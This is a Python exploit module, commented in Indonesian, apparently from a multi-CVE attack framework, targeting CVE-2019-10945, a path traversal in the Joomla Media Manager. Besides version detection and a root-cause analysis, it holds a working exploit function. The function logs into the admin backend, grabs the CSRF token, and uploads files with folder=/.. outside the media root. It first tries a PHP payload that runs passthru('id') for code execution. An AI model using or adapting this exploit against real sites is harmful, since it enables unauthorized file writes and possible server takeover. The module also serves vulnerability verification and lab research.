#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2019-10945 — Media Manager tidak menyaring parameter `folder` (path traversal).
Affected : Joomla! sebelum 3.9.5   |   Patched: 3.9.5
NVD      : CVSS 3.0 9.8 / AV:N/AC:L/PR:N/UI:N  -- **PR:N SALAH** (lihat di bawah)

SUMBER (diverifikasi dari diff 3.9.4 -> 3.9.5, bukan dari teks advisory):

  administrator/components/com_media/controllers/file.json.php :: upload()
  3.9.4:
        $file    = $this->input->files->get('Filedata', '', 'array');
        $folder  = $this->input->get('folder', '', 'path');       // tanpa jail
        $fileparts = pathinfo(COM_MEDIA_BASE . '/' . $folder . '/' . $file['name']);
        $files['final'] = $fileparts['dirname'] . DIRECTORY_SEPARATOR . $safeFileName;
        JFile::upload($object_file->tmp_name, $object_file->filepath);
  3.9.5 menambahkan (juga di controllers/folder.php, controllers/file.php, models/list.php):
        if (strpos(realpath($filepath), JPath::clean(COM_MEDIA_BASE)) !== 0) { tolak }

  Nilai `folder` divalidasi filter 'path' Joomla
  (libraries/vendor/joomla/filter/src/InputFilter.php, case 'PATH':
   /^[A-Za-z0-9_\/-]+[A-Za-z0-9_\.-]*([\\\/][A-Za-z0-9_-]+[A-Za-z0-9_\.-]*)*$/)
  Ternyata bentuk absolut **lolos**: `folder=/..` cocok dengan regex (kelas pertama
  memuat '/', kelas kedua memuat '.') sehingga tersambung menjadi
  `COM_MEDIA_BASE . '/' . '/..' . '/' . nama` = `.../images/../nama` = DI LUAR media root.

KENAPA BUKAN UNAUTH (NVD PR:N salah):
  components/com_media/media.php (sisi SITUS) hanya memuat bahasa lalu
  `require_once JPATH_COMPONENT_ADMINISTRATOR . '/media.php';` dan file admin itu
  (baris 18) memeriksa `$user->authorise('core.manage', 'com_media')` -> tanpa sesi
  backend hasilnya halaman login/403. Kontrol lab: request tanpa sesi tidak pernah
  sampai ke controller.

BATAS DAMPAK (penting, dan membedakannya dari RCE):
  Unggahan tetap melewati JFilterInput::isSafeFile() (libraries/src/Filter/InputFilter.php)
  yang mem-blacklist ekstensi `php, phps, pht, phtml, php3..php7, phar, inc, pl, cgi,
  fcgi, java, jar, py`, isi bertag `<?php`/`<?`, dan stub `__HALT_COMPILER()`.
  Karena itu pada konfigurasi default outcome-nya adalah **tulis berkas di luar media root**
  (ekstensi yang diizinkan, mis. .txt), BUKAN eksekusi kode. RCE hanya muncul bila server
  memetakan ekstensi yang diizinkan ke PHP (mis. masalah kelas CVE-2018-11322: .phar
  dieksekusi webserver) — itu miskonfigurasi lingkungan, bukan bagian CVE ini.

BUKTI LAB (2026-11-08):
  mp-j394 @8130  Joomla 3.9.4 + PHP 7.4 + MySQL 5.7 (super user labadmin)
      unggah `folder=/..` -> {"status":"1","location":"/images/../<nama>.txt"} dan berkas
      dapat diambil di http://.../<nama>.txt  (WEBROOT, di luar /images) = tulis di luar root
      3.9.5 @8131 -> {"status":"0","Unable to upload file."} + berkas tidak ada (jail realpath)
      Percobaan .php/.phtml -> ditolak (isSafeFile) — dibuktikan, bukan diasumsikan.
"""

import random
import re
import string

import requests

from mp import (CveModule, ST_CLEAN, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN, ST_VULN,
                detect_platform, parse_ver, register, ver_le)

MANIFEST = "/administrator/manifests/files/joomla.xml"
FIXED = (3, 9, 5)


def _joomla_version(t, h):
    cached = getattr(t, "_j10945ver", None)
    if cached is not None:
        return cached
    val = (None, "")
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                val = (v, m.group(1))
    try:
        t._j10945ver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _rand(n=8):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def _login(base, user, password, timeout=25):
    s = requests.Session()
    r = s.get(base + "/administrator/index.php", timeout=timeout)
    m = re.search(r'name="([a-f0-9]{32})"\s+value="1"', r.text)
    if not m:
        return None, "token login tidak ditemukan (bukan Joomla admin?)"
    r2 = s.post(base + "/administrator/index.php",
                data={"username": user, "passwd": password, "option": "com_login",
                      "task": "login", "return": "aW5kZXgucGhw", m.group(1): "1"},
                timeout=timeout)
    low = r2.text.lower()
    if "logout" not in low and "control panel" not in low and "com_cpanel" not in low:
        return None, f"login gagal (http={r2.status_code})"
    return s, "ok"


def _fresh_token(s, base, timeout=25):
    r = s.get(base + "/administrator/index.php?option=com_media", timeout=timeout)
    m = re.search(r'name="([a-f0-9]{32})"\s+value="1"', r.text)
    return m.group(1) if m else None


def _upload(base, s, token, folder, filename, content, timeout=30):
    url = (base + "/administrator/index.php?option=com_media&task=file.upload"
                  "&format=json&folder=" + folder)
    return s.post(url, data={token: "1"},
                  files={"Filedata": (filename, content)}, timeout=timeout)


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not ver_le(ver, (3, 9, 4)):
        return ST_CLEAN, f"Joomla {ver_s} — sudah >= 3.9.5 (jail realpath di com_media)", \
                         f"version={ver_s}"
    # konfirmasi entry com_media ada (tanpa mengubah apa pun)
    r = h.get(t.url + "/administrator/index.php?option=com_media")
    reach = "tidak terset" if r is None else f"HTTP {r.status_code}"
    return (ST_INFO,
            f"Joomla {ver_s} — com_media tanpa jail realpath (parameter `folder` bisa keluar "
            f"dari media root). Butuh sesi backend dengan hak com_media (bukan unauth)",
            f"version={ver_s} | com_media entry {reach}")


def exploit(t, h, opts):
    """
    Outcome terkontrol: menulis berkas DI LUAR media manager root (dibuktikan dengan
    mengambilnya lewat URL webroot). Bila server memetakan ekstensi yang diizinkan ke
    PHP, percobaan eksekusi dijalankan lebih dulu dan hasilnya dilaporkan sebagai PWN.
    """
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not ver_le(ver, (3, 9, 4)):
        return ST_CLEAN, f"Joomla {ver_s} — sudah >= 3.9.5 (jail realpath di com_media)", \
                         f"version={ver_s}"

    user = (getattr(opts, "username", None) or "").strip()
    password = getattr(opts, "password", None) or ""
    if not user or not password:
        return (ST_VULN,
                f"Joomla {ver_s} — com_media rawan path traversal, tetapi modul butuh "
                f"kredensial backend (--username/--password) untuk menjangkau controller",
                f"version={ver_s} | kredensial tidak diberikan")

    s, info = _login(t.url, user, password)
    if s is None:
        return ST_UNKNOWN, f"Joomla {ver_s} — {info}", f"version={ver_s}"
    token = _fresh_token(s, t.url)
    if not token:
        return ST_UNKNOWN, "token CSRF com_media tidak ditemukan setelah login", ""

    marker = _rand(10)
    ev = f"version={ver_s} | login={user} | folder=/.."

    # 1) percobaan eksekusi (butuh lingkungan yang memetakan ekstensi ke PHP)
    php_name = f"mp10945_{marker}.php"
    body = f'<?php echo "MP10945-{marker}["; passthru("id"); echo "]"; ?>'.encode()
    r = _upload(t.url, s, token, "/..", php_name, body)
    try:
        j = r.json()
    except Exception:  # noqa: BLE001
        j = {}
    if str(j.get("status")) == "1":
        rr = requests.get(f"{t.url}/{php_name}", timeout=20)
        m = re.search(r"MP10945-" + marker + r"\[([^\]]*)\]", rr.text)
        if m:
            return (ST_PWN,
                    f"RCE: berkas di luar media root dieksekusi -> {m.group(1).strip()}",
                    ev + f" | {php_name}")
        ev += " | unggah .php berhasil tapi tidak dieksekusi"

    # 2) pembuktian tulis di luar media root (ekstensi yang diizinkan)
    safe_name = f"mp10945_{marker}.txt"
    payload = f"MP10945-WRITE-OUTSIDE-{marker}\n".encode()
    r2 = _upload(t.url, s, token, "/..", safe_name, payload)
    try:
        j2 = r2.json()
    except Exception:  # noqa: BLE001
        j2 = {}
    loc = str(j2.get("location", ""))
    rr2 = requests.get(f"{t.url}/{safe_name}", timeout=20)
    if rr2.status_code == 200 and marker in rr2.text:
        note = " (.php ditolak isSafeFile)" if str(j.get("status")) != "1" else ""
        return (ST_VULN,
                f"Berkas tertulis DI LUAR media root: {t.url}/{safe_name}{note} — dampak CVE ini "
                f"(bukan RCE pada konfigurasi default)",
                ev + f" | location={loc} | bukti={t.url}/{safe_name}")
    return (ST_VULN,
            f"Joomla {ver_s} rawan, tetapi pembuktian tulis gagal (status={j2.get('status')!r}, "
            f"pesan={j2.get('message')!r}) — bisa jadi media root tidak writable atau respons "
            f"tidak dapat diambil lewat webroot",
            ev + f" | response={str(j2)[:120]}")


register(CveModule(
    cve="CVE-2019-10945",
    cluster="joomla_core",
    title="Joomla Core - Media Manager path traversal (parameter folder) -> tulis berkas "
          "di luar media root",
    vclass="path traversal",
    cvss="9.8",
    severity="critical",
    cwe="CWE-22",
    product="Joomla! Core (administrator/components/com_media)",
    versions_affected="1.5.0-3.9.4",
    status="verified",
    requires=[
        "sesi backend dengan hak com_media (core.manage/core.create) — NVD menandai PR:N, "
        "itu TIDAK benar: entry sisi situs memuat file admin yang memeriksa ACL",
        "direktori tujuan (di luar media root, mis. document root) writable oleh user web "
        "server — pada real target sering demikian (atau pakai jalur lain yang writable)",
        "--username/--password di tool",
    ],
    check=check,
    exploit=exploit,
    notes=(
        "Sink (3.9.4): controllers/file.json.php::upload() memakai "
        "$folder = $this->input->get('folder','','path') lalu menyambungnya ke COM_MEDIA_BASE "
        "tanpa jail. Filter 'path' Joomla menolak '../..' tetapi MELOLOSKAN bentuk absolut "
        "seperti '/..' (regex InputFilter case 'PATH' mengizinkan '/' di kelas pertama dan "
        "'.' di kelas kedua) sehingga `COM_MEDIA_BASE.'/'.'/..'` menunjuk ke luar media root. "
        "Patch 3.9.5 menambahkan strpos(realpath($path), JPath::clean(COM_MEDIA_BASE)) !== 0 "
        "di controllers/folder.php, controllers/file.php, controllers/file.json.php, dan "
        "models/list.php. Dampak default = tulis berkas di luar media root (ekstensi "
        "diizinkan); eksekusi kode terhalang isSafeFile yang mem-blacklist "
        "php/phps/pht/phtml/php3..php7/phar/inc/pl/cgi/fcgi/java/jar/py + tag <?php + stub "
        "__HALT_COMPILER. Bukti lab: 3.9.4 @8130 menulis mp10945_<rand>.txt ke WEBROOT "
        "(GET /mp10945_<rand>.txt = 200, isi cocok) sementara 3.9.5 @8131 menolak; percobaan "
        ".php/.phtml ditolak isSafeFile (dibuktikan). Sink lain yang ikut dipatch tetapi belum "
        "diverifikasi di lab: folder.create (foldername tanpa filter), folder.delete & "
        "file.delete (array rm[] mentah), models/list.php (listing)."
    ),
))
